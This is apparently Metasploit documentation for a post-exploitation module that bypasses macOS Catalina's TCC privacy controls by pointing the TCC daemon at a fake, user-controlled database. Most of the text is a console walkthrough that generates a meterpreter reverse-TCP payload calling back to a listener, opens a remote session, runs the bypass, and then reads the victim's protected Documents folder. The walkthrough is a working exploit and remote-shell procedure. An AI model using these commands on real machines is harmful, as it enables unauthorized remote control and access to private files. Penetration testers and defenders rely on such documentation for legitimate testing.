## Vulnerable Application

This module exploits a vulnerability in the TCC daemon on macOS Catalina
(<= 10.15.5) in order to grant TCC entitlements. The TCC daemon can be
manipulated (by setting the HOME environment variable) to use a new user
controlled location as the TCC database. We can then grant ourselves
entitlements by inserting them into this new database.

## Verification Steps

  1. Start msfconsole
  1. Get a user session on OSX 10.15.5 (or lower)
  1. Do: ```use post/osx/escalate/tccbypass```
  1. Do: ```set SESSION -1```
  1. Do: ```run```
  1. Your session should now be able to access the ~/Documents folder

## Scenarios

### User level shell on macOS Catalina 10.15.4

```
msf6 > use payload/osx/x64/meterpreter/reverse_tcp
msf6 payload(osx/x64/meterpreter/reverse_tcp) > set lhost 192.168.135.197
lhost => 192.168.135.197
msf6 payload(osx/x64/meterpreter/reverse_tcp) > set lport 4567
lport => 4567
msf6 payload(osx/x64/meterpreter/reverse_tcp) > generate -f macho -o revtcpx64.mac
[*] Writing 17204 bytes to revtcpx64.mac...
msf6 payload(osx/x64/meterpreter/reverse_tcp) > to_handler
[*] Payload Handler Started as Job 0

[*] Started reverse TCP handler on 192.168.135.197:4567 
msf6 payload(osx/x64/meterpreter/reverse_tcp) > [*] Transmitting first stager...(210 bytes)
[*] Transmitting second stager...(8192 bytes)
[*] Sending stage (799916 bytes) to 192.168.132.178
[*] Meterpreter session 1 opened (192.168.135.197:4567 -> 192.168.132.178:49156) at 2020-09-10 11:44:05 -0500

msf6 payload(osx/x64/meterpreter/reverse_tcp) > sessions -i -1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer     : msfusers-Mac.local
OS           : macOS Catalina (macOS 10.15.4)
Architecture : x86
BuildTuple   : x86_64-apple-darwin
Meterpreter  : x64/osx
meterpreter > getuid
Server username: msfuser @ msfusers-Mac.local (uid=501, gid=20, euid=501, egid=20)
meterpreter > ls Documents
[-] 1009: Operation failed: 1
meterpreter > background
[*] Backgrounding session 1...
msf6 payload(osx/x64/meterpreter/reverse_tcp) > use post/osx/escalate/tccbypass 
msf6 post(osx/escalate/tccbypass) > show options

Module options (post/osx/escalate/tccbypass):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf6 post(osx/escalate/tccbypass) > set session 1
session => 1
msf6 post(osx/escalate/tccbypass) > set verbose true
verbose => true
msf6 post(osx/escalate/tccbypass) > run

[*] Creating TCC directory /tmp/.SZulaEVB/Library/Application Support/com.apple.TCC
[+] fake TCC DB found: /tmp/.SZulaEVB/Library/Application Support/com.apple.TCC/TCC.db
[+] TCC.db was successfully updated!
[*] To cleanup, run:
launchctl unsetenv HOME && launchctl stop com.apple.tccd && launchctl start com.apple.tccd
rm -rf '/tmp/.SZulaEVB'

[*] Post module execution completed
msf6 post(osx/escalate/tccbypass) > sessions -i -1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: msfuser @ msfusers-Mac.local (uid=501, gid=20, euid=501, egid=20)
meterpreter > ls Documents 
Listing: Documents
==================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  0     fil   2020-08-14 13:51:29 -0500  .localized

meterpreter > 
```
